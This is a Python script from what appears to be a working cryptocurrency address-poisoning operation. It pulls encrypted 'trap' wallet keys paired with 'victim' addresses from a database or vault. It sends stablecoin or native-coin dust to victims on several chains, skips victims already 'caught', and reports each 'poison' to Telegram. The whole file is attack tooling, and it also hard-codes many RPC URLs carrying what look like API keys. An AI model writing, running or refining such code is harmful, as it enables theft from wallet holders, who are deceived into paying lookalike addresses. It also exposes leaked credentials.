#!/usr/bin/env python3
import sys
import os
import re
import time
import argparse
from datetime import datetime, timezone
from web3 import Web3
from dotenv import load_dotenv
from web3.exceptions import TimeExhausted

# --- Ensure we don't let .env overwrite OS-level PM2 variables ---
load_dotenv(override=False)

# --- Official POA middleware import ---
try:
    from web3.middleware import geth_poa_middleware
except ImportError:
    try:
        from web3.middleware import poa
        geth_poa_middleware = poa
    except ImportError:
        try:
            from web3.middleware import geth_poa
            geth_poa_middleware = geth_poa
        except ImportError:
            geth_poa_middleware = None
            print('[DEBUG] POA middleware not found; BSC/Polygon may have extraData errors.')

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from lib.config import config
from lib.logger import logger
from lib.notifier import send_telegram
from lib.shutdown import setup_graceful_shutdown
from lib.encryption import decrypt

# --- Supabase client for job tracking ---
try:
    from supabase import create_client
except ImportError:
    create_client = None

SUPABASE_URL = os.getenv("NEXT_PUBLIC_SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_SERVICE_ROLE_KEY")
supabase = None
if SUPABASE_URL and SUPABASE_KEY and create_client:
    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

# ─── Read preferred asset from environment (set by re_poison.js) ───
PREFERRED_ASSET = os.getenv("DUST_ASSET")
if PREFERRED_ASSET:
    print(f'[DEBUG] PREFERRED_ASSET from env: {PREFERRED_ASSET}')
else:
    print('[DEBUG] No PREFERRED_ASSET set, will use default fallback')

def update_job(job_id, status=None, progress=None, total=None, message=None):
    """Update job status in Supabase with proper ISO timestamps."""
    if not supabase or not job_id:
        return
    data = {}
    if status is not None:
        data["status"] = status
    if progress is not None:
        data["progress"] = progress
    if total is not None:
        data["total"] = total
    if message is not None:
        data["message"] = message
        
    iso_now = datetime.now(timezone.utc).isoformat()
    if status == "running" and "started_at" not in data:
        data["started_at"] = iso_now
    if status in ("completed", "failed"):
        data["completed_at"] = iso_now

    if not data:
        return

    try:
        supabase.table("jobs").update(data).eq("id", job_id).execute()
    except Exception as e:
        logger.error(f"Failed to update job {job_id}: {e}")

def get_campaign_id_from_job(job_id):
    """Retrieve campaign_id from job record."""
    if not supabase:
        return None
    try:
        result = supabase.table("jobs").select("campaign_id").eq("id", job_id).execute()
        if result.data:
            return result.data[0]["campaign_id"]
    except Exception as e:
        logger.error(f"Failed to get campaign_id for job {job_id}: {e}")
    return None

print('[DEBUG] Starting duster.py...')

# --- MULTI‑CHAIN: STRICT PM2 Env Var Prioritization ---
CHAIN = os.getenv('CHAIN') or getattr(config, 'CHAIN', 'ethereum')
chain_cfg = config.get_chain_config() if hasattr(config, 'get_chain_config') else None

if chain_cfg and 'tokens' in chain_cfg:
    TOKEN_CONFIG = chain_cfg['tokens']
else:
    TOKEN_CONFIG = config.TOKEN_CONFIG

if chain_cfg and 'dust' in chain_cfg:
    DUST_AMOUNT = chain_cfg['dust']
else:
    DUST_AMOUNT = config.DUST_AMOUNT

NATIVE_SYMBOL = chain_cfg['native_symbol'] if chain_cfg and 'native_symbol' in chain_cfg else 'ETH'

if hasattr(config, 'get_chain_rpc'):
    RPC_URL = config.get_chain_rpc()
else:
    RPC_URL = config.DUSTER_RPC_URL

if RPC_URL is None or RPC_URL == "":
    RPC_URL = os.getenv("DUSTER_RPC_URL") or os.getenv("NODE_RPC_URL")

print(f'[DEBUG] Chain: {CHAIN}, Native symbol: {NATIVE_SYMBOL}')
print('[DEBUG] DUST_AMOUNT:', DUST_AMOUNT)
print('[DEBUG] TOKEN_CONFIG:', TOKEN_CONFIG)
print(f'[DEBUG] Using RPC: {RPC_URL}')

# --- Custom HTTPProvider that truncates extraData for POA chains ---
class POAHTTPProvider(Web3.HTTPProvider):
    def make_request(self, method, params):
        response = super().make_request(method, params)
        if method in ('eth_getBlockByNumber', 'eth_getBlockByHash'):
            if 'result' in response and 'extraData' in response['result']:
                extra = response['result']['extraData']
                if isinstance(extra, str):
                    extra_bytes = bytes.fromhex(extra[2:] if extra.startswith('0x') else extra)
                else:
                    extra_bytes = extra
                if len(extra_bytes) > 32:
                    response['result']['extraData'] = '0x' + extra_bytes[:32].hex()
        return response

# Handle POA middleware import across different web3.py versions
try:
    from web3.middleware import geth_poa_middleware
except ImportError:
    try:
        from web3.middleware import ExtraDataToPOAMiddleware as geth_poa_middleware
    except ImportError:
        geth_poa_middleware = None


# ─── Public RPC fallbacks (Verified High-Availability Nodes) ───
PUBLIC_RPC_FALLBACKS = {
    'bsc': [
    'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
    'https://bsc-dataseed.binance.org',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
    'https://rpc.ankr.com/bsc',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
    'https://bsc.publicnode.com',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
    'https://1rpc.io/bnb',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
    'https://bsc.drpc.org',
    'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
  ],
  'polygon': [
    'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
    'https://polygon-rpc.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
    'https://rpc.ankr.com/polygon',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
    'https://polygon.llamarpc.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
    'https://polygon.publicnode.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
    'https://1rpc.io/polygon',
    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
  ],
  'ethereum': [
    'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
    'https://ethereum.publicnode.com',
    'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
    'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
    'https://rpc.ankr.com/eth',
    'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
    'https://eth.llamarpc.com',
    'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
    'https://1rpc.io/eth',
    'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
    'https://eth.drpc.org',
    'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
    'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
  ],
}

def get_web3():
    get_var = lambda name: getattr(config, name, None) or os.getenv(name)

    raw_urls = [
        get_var("RPC_URL"),
        get_var("DUSTER_RPC_URL"),
        get_var("NODE_RPC_URL"),
    ] + getattr(config, "FALLBACK_RPC_URLS", []) + PUBLIC_RPC_FALLBACKS.get(CHAIN.lower(), [])

    rpc_urls = list(dict.fromkeys([url for url in raw_urls if url]))

    print(f'[DEBUG] Trying {len(rpc_urls)} RPC URLs...')

    for url in rpc_urls:
        try:
            print(f'[DEBUG] Connecting to {url}...')
            provider = Web3.HTTPProvider(url, request_kwargs={'timeout': 10})
            w3 = Web3(provider)

            if w3.is_connected():
                if CHAIN.lower() in ('bsc', 'polygon') and geth_poa_middleware is not None:
                    try:
                        w3.middleware_onion.inject(geth_poa_middleware, layer=0)
                    except Exception as e:
                        print(f'[DEBUG] POA middleware injection skipped/failed: {e}')

                logger.info(f"Connected to RPC: {url}")
                return w3
        except Exception as e:
            print(f'[DEBUG] Connection failed for {url}: {e}')
            continue

    logger.critical("No RPC connection available.")
    sys.exit(1)

w3 = get_web3()
print('[DEBUG] Web3 instance ready.')

VAULT_FILE = config.VAULT_FILE

ERC20_ABI = [
    {
        "constant": False,
        "inputs": [{"name": "to", "type": "address"}, {"name": "value", "type": "uint256"}],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function",
    },
    {
        "constant": True,
        "inputs": [{"name": "owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function",
    },
]

def call_with_retry(func, *args, max_attempts=3, base_delay=1, **kwargs):
    last_exc = None
    for attempt in range(1, max_attempts + 1):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            last_exc = e
            err_str = str(e).lower()
            if attempt < max_attempts:
                delay = base_delay * (2 ** (attempt - 1))
                if "429" in err_str or "too many requests" in err_str or "limit" in err_str:
                    delay = max(delay, 5)
                logger.warning(f"Retry {attempt}/{max_attempts} for {func.__name__} after {delay}s: {e}")
                time.sleep(delay)
            else:
                raise
    raise last_exc

def get_token_balance(address, token_symbol):
    token_addr = TOKEN_CONFIG.get(token_symbol)
    if not token_addr:
        return 0
    token = w3.eth.contract(address=w3.to_checksum_address(token_addr), abi=ERC20_ABI)
    try:
        balance = call_with_retry(token.functions.balanceOf, address).call()
        return balance
    except Exception as e:
        logger.warning(f"Failed to get token balance for {address}: {e}")
        return 0

# ─── Modified choose_asset with detailed messaging support ───
def choose_asset(victim, trap, preferred_asset=None):
    victim_usdc = get_token_balance(victim, "USDC")
    trap_usdc = get_token_balance(trap, "USDC")
    victim_usdc_native = get_token_balance(victim, "USDC_NATIVE")
    trap_usdc_native = get_token_balance(trap, "USDC_NATIVE")
    
    victim_usdt = get_token_balance(victim, "USDT")
    trap_usdt = get_token_balance(trap, "USDT")
    
    trap_native_bal = call_with_retry(w3.eth.get_balance, trap)
    victim_native_bal = call_with_retry(w3.eth.get_balance, victim)
    
    force_stable = os.getenv("FORCE_STABLECOIN_DUST", "").lower() == "true"

    def fmt(balance, decimals):
        return f"{balance / (10**decimals):.6f}"

    usdc_decimals = 6
    usdc_dust = DUST_AMOUNT.get("USDC", 0)
    usdt_decimals = 6
    usdt_dust = DUST_AMOUNT.get("USDT", 0)

    # Check viability
    usdc_ok = trap_usdc >= usdc_dust and (victim_usdc > 0 or force_stable)
    usdt_ok = trap_usdt >= usdt_dust and (victim_usdt > 0 or force_stable)

    # 1. Try preferred asset first
    if preferred_asset:
        pref_upper = preferred_asset.upper()
        if pref_upper == "USDC" and usdc_ok:
            msg = f"ℹ️ Using USDC because trap USDT balance ({fmt(trap_usdt, usdt_decimals)}) is below the dust threshold ({fmt(usdt_dust, usdt_decimals)})." if not usdt_ok else None
            return ("USDC", usdc_dust, msg)
        elif pref_upper == "USDT" and usdt_ok:
            msg = f"ℹ️ Using USDT because trap USDC balance ({fmt(trap_usdc, usdc_decimals)}) is below the dust threshold ({fmt(usdc_dust, usdc_decimals)})." if not usdc_ok else None
            return ("USDT", usdt_dust, msg)
        elif pref_upper == NATIVE_SYMBOL and trap_native_bal >= DUST_AMOUNT.get(NATIVE_SYMBOL, 0):
            return (NATIVE_SYMBOL, DUST_AMOUNT.get(NATIVE_SYMBOL, 0), None)

    # 2. Fallback to USDC
    if usdc_ok:
        msg = f"ℹ️ Using USDC because trap USDT balance ({fmt(trap_usdt, usdt_decimals)}) is below the dust threshold ({fmt(usdt_dust, usdt_decimals)})." if (preferred_asset and preferred_asset.upper() == "USDT" and not usdt_ok) else None
        return ("USDC", usdc_dust, msg)

    # 3. Fallback to USDT
    if usdt_ok:
        msg = f"ℹ️ Using USDT because trap USDC balance ({fmt(trap_usdc, usdc_decimals)}) is below the dust threshold ({fmt(usdc_dust, usdc_decimals)})." if (preferred_asset and preferred_asset.upper() == "USDC" and not usdc_ok) else None
        return ("USDT", usdt_dust, msg)

    # 4. Neither is ok. Build detailed error message.
    reasons = []
    
    if trap_usdc < usdc_dust:
        reasons.append(f"Trap USDC balance ({fmt(trap_usdc, usdc_decimals)}) is below the dust threshold ({fmt(usdc_dust, usdc_decimals)}).")
    elif victim_usdc == 0 and not force_stable:
        reasons.append("Victim has 0 USDC balance.")
        
    if trap_usdt < usdt_dust:
        reasons.append(f"Trap USDT balance ({fmt(trap_usdt, usdt_decimals)}) is below the dust threshold ({fmt(usdt_dust, usdt_decimals)}).")
    elif victim_usdt == 0 and not force_stable:
        reasons.append("Victim has 0 USDT balance.")

    if preferred_asset and preferred_asset.upper() == NATIVE_SYMBOL:
        native_dust = DUST_AMOUNT.get(NATIVE_SYMBOL, 0)
        if trap_native_bal < native_dust:
            reasons.append(f"Preferred native asset {NATIVE_SYMBOL} balance ({fmt(trap_native_bal, 18)}) is below the dust threshold ({fmt(native_dust, 18)}).")

    error_msg = "❌ No suitable stablecoin found to send dust.\nDetails:\n" + "\n".join([f"• {r}" for r in reasons]) if reasons else "❌ No suitable stablecoin found."
    
    return (None, 0, error_msg)

_last_low_balance_alert = {}
_local_nonces = {}

# ─── Modified send_dust to support detailed messaging ───
def send_dust(private_key, victim_address, campaign_id=None):
    try:
        victim = w3.to_checksum_address(victim_address)
        account = w3.eth.account.from_key(private_key)
        trap = account.address
        logger.info(f"Trap: {trap} -> Victim: {victim}")

        # Pass preferred_asset from environment to choose_asset
        preferred_from_env = os.getenv("DUST_ASSET")
        asset, dust, info_msg = choose_asset(victim, trap, preferred_from_env)
        
        if asset is None:
            msg = info_msg or f"❌ No suitable stablecoin found to send dust from trap {trap} to victim {victim}."
            logger.warning(msg)
            print('[DEBUG] No asset found. Aborting.')
            send_telegram(msg, campaign_id=campaign_id)
            return False  # Safe return for batch_poison
            
        logger.info(f"Chosen asset: {asset}, dust: {dust} units")
        if info_msg:
            logger.info(info_msg)

        # --- BULLETPROOF HYBRID NONCE MANAGEMENT ---
        rpc_nonce = call_with_retry(w3.eth.get_transaction_count, trap, "pending")
        if trap not in _local_nonces:
            _local_nonces[trap] = rpc_nonce
        else:
            _local_nonces[trap] = max(_local_nonces[trap], rpc_nonce)
        nonce = _local_nonces[trap]

             # --- DYNAMIC GAS & EIP-1559 / LEGACY PRICING (Matched to batch_fund.py) ---
        latest_block = call_with_retry(w3.eth.get_block, "latest")
        
        use_eip1559 = (
            "baseFeePerGas" in latest_block 
            and latest_block["baseFeePerGas"] is not None 
            and CHAIN.lower() != "bsc"
        )

        gas_params = {}
        # Match batch_fund.py's safer 100 Gwei cap default
        max_fee_cap = w3.to_wei(getattr(config, 'GAS_MAX_FEE_CAP_GWEI', 100), "gwei")
        
        # First attempt, so gas_bump is 1.0
        gas_bump = 1.0

        if use_eip1559:
            base_fee = latest_block["baseFeePerGas"]
            
            try:
                max_priority = w3.eth.max_priority_fee
            except Exception:
                max_priority = w3.to_wei(0.05, "gwei")

            max_priority = int(max_priority * gas_bump)
            buffer = 1.1 * gas_bump  # 10% buffer, matching batch_fund.py exactly
            max_fee = int((base_fee * buffer) + max_priority)
            max_fee = min(max_fee, max_fee_cap)

            # Invariant: maxFeePerGas >= maxPriorityFeePerGas
            if max_fee < max_priority:
                max_fee = max_priority

            gas_params['maxFeePerGas'] = max_fee
            gas_params['maxPriorityFeePerGas'] = max_priority
            effective_gas_price = max_fee
        else:
            gas_price = w3.eth.gas_price
            legacy_buffer = 1.05 * gas_bump  # 5% buffer for legacy chains
            capped_gas_price = min(int(gas_price * legacy_buffer), max_fee_cap)
            gas_params['gasPrice'] = capped_gas_price
            effective_gas_price = capped_gas_price

        chain_id = w3.eth.chain_id

        # ─── BUILD TRANSACTION (Supports BOTH Native and ERC-20) ───
        if asset == NATIVE_SYMBOL:
            # Native transfer logic
            tx_payload = {
                "from": trap,
                "to": victim,
                "value": dust,
                "nonce": nonce,
                "chainId": chain_id,
                "gas": 21000,  # Native transfers always use 21000 gas
                **gas_params
            }
            tx = tx_payload
            required_eth = (21000 * effective_gas_price) + dust
        else:
            # ERC-20 transfer logic
            token_addr = TOKEN_CONFIG.get(asset)
            if not token_addr:
                logger.error(f"Unknown token {asset}")
                return False
                
            token = w3.eth.contract(address=w3.to_checksum_address(token_addr), abi=ERC20_ABI)
            token_balance = call_with_retry(token.functions.balanceOf, trap).call()
            
            if token_balance < dust:
                msg = f"⚠️ Insufficient {asset} balance in trap {trap} for victim {victim}. Need {dust}, have {token_balance}. Aborting."
                logger.warning(msg)
                send_telegram(msg, campaign_id=campaign_id)
                return False

            try:
                estimated = call_with_retry(token.functions.transfer(victim, dust).estimate_gas, {'from': trap})
                gas_limit = int(estimated * 1.05)
            except Exception as e:
                logger.warning(f"Gas estimation failed: {e}, using fallback 68000")
                gas_limit = 68000

            tx_payload = {
                "from": trap,
                "nonce": nonce,
                "chainId": chain_id,
                "gas": gas_limit,
                **gas_params
            }
            tx = token.functions.transfer(victim, dust).build_transaction(tx_payload)
            required_eth = gas_limit * effective_gas_price

        # --- Final balance check before broadcast ---
        native_balance = call_with_retry(w3.eth.get_balance, trap)

        MIN_RESERVE_NATIVE = float(os.getenv("MIN_RESERVE_NATIVE", "0.0001"))
        threshold_wei = w3.to_wei(MIN_RESERVE_NATIVE, 'ether')
        now = time.time()
        if native_balance < threshold_wei:
            last_alert = _last_low_balance_alert.get(trap, 0)
            if now - last_alert > 3600:
                alert_msg = (
                    f"⚠️ Low {NATIVE_SYMBOL} balance in trap {trap}\n"
                    f"Balance: {w3.from_wei(native_balance, 'ether')} {NATIVE_SYMBOL}\n"
                    f"Threshold: {MIN_RESERVE_NATIVE} {NATIVE_SYMBOL}"
                )
                send_telegram(alert_msg, campaign_id=campaign_id)
                _last_low_balance_alert[trap] = now
                logger.warning(alert_msg)

        if native_balance < required_eth:
            msg = f"⚠️ Insufficient {NATIVE_SYMBOL} for gas in trap {trap}. Need {w3.from_wei(required_eth, 'ether')}, have {w3.from_wei(native_balance, 'ether')}."
            logger.error(msg)
            send_telegram(msg, campaign_id=campaign_id)
            return False

        signed = w3.eth.account.sign_transaction(tx, private_key)
        raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
        
        try:
            tx_hash = w3.eth.send_raw_transaction(raw_tx)
            _local_nonces[trap] += 1 
        except Exception as e:
            err_msg = str(e).lower()
            if "already known" in err_msg or "nonce too low" in err_msg:
                _local_nonces[trap] += 1
            raise e 
        
        logger.info(f"TX hash: {tx_hash.hex()}")

        try:
            # Wait up to 120 seconds for the receipt. 
            # This is safely under the 180s Node.js timeout, preventing premature kills.
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
            
            if receipt.status == 1:
                try:
                    decimals = config.get_token_decimals().get(asset, 6) if hasattr(config, 'get_token_decimals') else 6
                except AttributeError:
                    decimals = 6
                
                success_msg = f"✅ Poison sent successfully!\nVictim: {victim}\nTrap: {trap}\nAmount: {dust / 10**decimals:.6f} {asset}\nTX: {tx_hash.hex()}"
                
                if info_msg:
                    success_msg += f"\n\n{info_msg}"
                    
                send_telegram(success_msg, campaign_id=campaign_id)
                return True
            else:
                # Explicitly caught a revert. Returns False so re_poison.js can retry.
                logger.error("Transaction reverted on-chain.")
                send_telegram(f"❌ Poison transaction reverted\nVictim: {victim}\nTrap: {trap}\nTX: {tx_hash.hex()}", campaign_id=campaign_id)
                return False
                
        except TimeExhausted:
            # Transaction is still pending. We return True to STOP re_poison.js from retrying.
            # Retrying a pending transaction with the same nonce is what causes the [CANCELLED] status.
            logger.warning(f"Transaction {tx_hash.hex()} is still pending after 120s. Avoiding duplicate retry.")
            send_telegram(f"⏳ Poison transaction is pending (taking longer than usual).\nVictim: {victim}\nTrap: {trap}\nTX: {tx_hash.hex()}", campaign_id=campaign_id)
            return True 
            
        except Exception as e:
            # Catches any other exact RPC or broadcasting errors
            logger.error(f"Error waiting for receipt: {e}")
            send_telegram(f"❌ Poison failed\nVictim: {victim_address}\nExact Error: {e}", campaign_id=campaign_id)
            return False
            
    except Exception as e:
        logger.error(f"Error: {e}")
        send_telegram(f"❌ Poison failed\nVictim: {victim_address}\nError: {e}", campaign_id=campaign_id)
        return False

def read_vault_lines(file_path):
    lines = []
    if not os.path.exists(file_path):
        return lines
    with open(file_path, 'r') as f:
        raw_lines = f.readlines()
        for idx, raw_line in enumerate(raw_lines):
            line = raw_line.strip()
            if not line:
                continue
            try:
                decrypted = decrypt(line)
                lines.append(decrypted)
            except Exception as e:
                logger.error(f"Failed to decrypt line {idx+1}: {e}")
                continue
    return lines

def get_trap_entries_from_db(campaign_id):
    entries = []
    if not supabase:
        logger.error("Supabase client not initialized.")
        return entries
    try:
        result = supabase.table("traps")\
            .select("victim_address, trap_private_key_enc")\
            .eq("campaign_id", campaign_id)\
            .execute()
        if not result.data:
            logger.info(f"No traps found for campaign {campaign_id}")
            return entries
        for row in result.data:
            enc_key = row.get("trap_private_key_enc")
            if not enc_key:
                continue
            try:
                private_key = decrypt(enc_key)
                w3.eth.account.from_key(private_key)
                victim = row.get("victim_address", "").lower()
                if victim:
                    entries.append((victim, private_key))
            except Exception as e:
                logger.error(f"Failed to decrypt private key for victim {row.get('victim_address')}: {e}")
                continue
        logger.info(f"Loaded {len(entries)} trap entries from database for campaign {campaign_id}")
    except Exception as e:
        logger.error(f"Failed to fetch traps from database: {e}")
    return entries

def batch_poison(job_id=None, campaign_id=None):
    if campaign_id:
        logger.info(f"Using database for campaign {campaign_id}")
        entries = get_trap_entries_from_db(campaign_id)
        if not entries:
            logger.error(f"No traps found for campaign {campaign_id}")
            return
    else:
        logger.info("Using vault file for legacy mode")
        if not os.path.exists(VAULT_FILE):
            logger.error(f"{VAULT_FILE} not found.")
            return
        decrypted_lines = read_vault_lines(VAULT_FILE)
        if not decrypted_lines:
            logger.error("No valid (decrypted) entries found in vault.txt")
            return
        entries = []
        for line in decrypted_lines:
            match = re.search(r"Victim:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})", line, re.IGNORECASE)
            if match:
                entries.append((match.group(1), match.group(2)))
            else:
                match = re.search(r"Target:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})", line, re.IGNORECASE)
                if match:
                    entries.append((match.group(1), match.group(2)))

    if not entries:
        logger.error("No valid entries found")
        return

    CAUGHT_FILE = config.CAUGHT_FILE
    caught = set()
    if os.path.exists(CAUGHT_FILE):
        try:
            with open(CAUGHT_FILE, 'r') as f:
                data = f.read()
                if data.strip():
                    for line in data.split('\n'):
                        addr = line.strip().lower()
                        if addr:
                            caught.add(addr)
            logger.info(f"Loaded {len(caught)} caught victims from {CAUGHT_FILE}")
        except Exception as e:
            logger.warning(f"Could not read caught victims file (possible race condition lock): {e}")

    total = len(entries)
    logger.info(f"Found {total} victims. Sending intelligent dust...")
    if job_id:
        update_job(job_id, total=total)

    success = 0
    for i, (victim, key) in enumerate(entries, 1):
        if victim.lower() in caught:
            logger.info(f"Skipping caught victim {victim}")
            continue

        logger.info(f"[{i}/{total}] Processing victim {victim}")
        
        if send_dust(key, victim, campaign_id=campaign_id):
            success += 1
        if job_id and i % 5 == 0:
            update_job(job_id, progress=i)
        time.sleep(1)

    logger.info(f"Completed: {success}/{total} successful.")
    send_telegram(f"🏁 Dust batch complete: {success}/{total} successful.", campaign_id=campaign_id)

    if job_id:
        if success == total:
            update_job(job_id, status='completed', progress=total, message='All done')
        else:
            update_job(job_id, status='failed', progress=success, message=f'{success}/{total} succeeded')

if __name__ == "__main__":
    setup_graceful_shutdown()

    parser = argparse.ArgumentParser()
    parser.add_argument('--job-id', help='Job ID for tracking')
    parser.add_argument('private_key', nargs='?', help='Private key for single dust send')
    parser.add_argument('victim_address', nargs='?', help='Victim address for single dust send')
    args = parser.parse_args()

    job_id = args.job_id
    campaign_id = None
    if job_id:
        update_job(job_id, status='running')
        campaign_id = get_campaign_id_from_job(job_id)
    else:
        campaign_id = os.getenv('CAMPAIGN_ID')

    if args.private_key and args.victim_address:
        # 🚨 CRITICAL FIX: In single mode (used by re_poison.js), we must exit 
        # with code 1 on failure so that Node.js execAsync correctly catches the error.
        success = send_dust(args.private_key, args.victim_address, campaign_id=campaign_id)
        if not success:
            sys.exit(1)
    else:
        batch_poison(job_id=job_id, campaign_id=campaign_id)